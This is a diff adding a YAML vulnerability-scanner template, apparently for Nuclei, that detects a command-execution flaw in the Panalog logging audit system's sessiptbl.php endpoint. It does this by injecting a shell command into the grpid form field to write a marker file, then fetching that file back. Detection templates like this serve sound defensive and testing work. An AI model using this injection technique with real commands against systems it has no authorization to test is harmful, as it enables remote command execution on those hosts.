@@ -1,0 +1,48 @@
+id: panalog-sessiptbl-rce
+
+info:
+  name: Panalog sessiptbl.php Command Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    Panalog logging audit system is vulnerable to a command execution vulnerability via the sessiptbl.php endpoint.
+
+variables:
+  t1: "{{rand_int(100,1000)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: step-1
+    method: POST
+    path:
+      - "{{BaseURL}}/sessiptbl.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=serverdelay&grpid=|echo "vulnerability" >test{{t1}}.txt
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ""
+        condition: and
+        part: body
+
+  - id: step-2
+    method: GET
+    path:
+      - "{{BaseURL}}/test{{t1}}.txt"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "vulnerability"
+        condition: and
+        part: body
